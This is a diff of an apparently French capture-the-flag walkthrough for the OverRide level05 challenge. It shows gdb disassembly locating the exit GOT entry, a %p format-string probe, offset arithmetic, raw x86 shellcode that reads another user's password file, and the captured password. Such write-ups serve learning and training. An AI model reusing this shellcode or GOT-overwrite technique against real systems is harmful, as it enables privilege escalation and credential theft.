@@ -1,9 +1,9 @@
 level05@OverRide:~$ ./level05
 hey
 hey
-level05@OverRide:~$ ./level05
-ls
-ls
+level05@OverRide:~$ ./level05 
+E
+e
 level05@OverRide:~$ ./level05
 5
 5
@@ -23,9 +23,12 @@ le buffer fait 100octets et il n'est pas possible de l'overflow
   char s[100]; // [esp+28h] [ebp-70h] BYREF
   fgets(s, 100, stdin);
 
-le programme finit par un   exit(0);
-donc je peux ecraser l'adresse de exit 
+le programme finit par un "exit(0)" donc je peux ecraser l'adresse de exit 
+Pour ca on vas la chercher:
 
+level05@OverRide:~$ gdb ./level05
+(gdb) disassemble main 
+   ...
    0x08048513 <+207>:   call   0x8048370 <exit@plt>
 End of assembler dump.
 (gdb) disassemble 0x8048370
@@ -41,14 +44,13 @@ End of assembler dump.
 l'adresse qui est stocker dans 0x80497e0 renvoie ver exit
 
 
-donc il faut remplacer la valeur dans 0x80497e0 par une env var 
-	qui contient le shellcode
+donc il faut remplacer la valeur dans 0x80497e0 par une env var qui contient le shellcode
 https://masterccc.github.io/tools/shellcode_gen/ /home/users/level06////.pass
 \x31\xc0\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x70\x61\x73\x73\x68\x2f\x2f\x2f\x2e\x68\x6c\x30\x36\x2f\x68\x6c\x65\x76\x65\x68\x65\x72\x73\x2f\x68\x65\x2f\x75\x73\x68\x2f\x68\x6f\x6d\x89\xe1\x50\x51\x53\x89\xe1\x31\xc0\x83\xc0\x0b\xcd\x80
 
 on ajoute init edx avec xor: \x31\xD2
 \x31\xc0\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x70\x61\x73\x73\x68\x2f\x2f\x2f\x2e\x68\x6c\x30\x36\x2f\x68\x6c\x65\x76\x65\x68\x65\x72\x73\x2f\x68\x65\x2f\x75\x73\x68\x2f\x68\x6f\x6d\x89\xe1\x50\x51\x53\x89\xe1\x31\xc0\x83\xc0\x0b\x31\xD2\xcd\x80
-67o
+67octets
 
 aaaa %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
 
@@ -83,11 +85,7 @@ ffff  dec1
 57025(- 8 octets d'avant = 57017)
 65535(- 57025 = 8510)
 
-level05@OverRide:~$ python script.py | ./level05
-$ whoami
-level06
-$ pwd
-/home/users/level05
-$ cat /home/users/level06/.pass
+level05@OverRide:~$ python /tmp/script.py | ./level05
+...
 h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
 level05@OverRide:~$
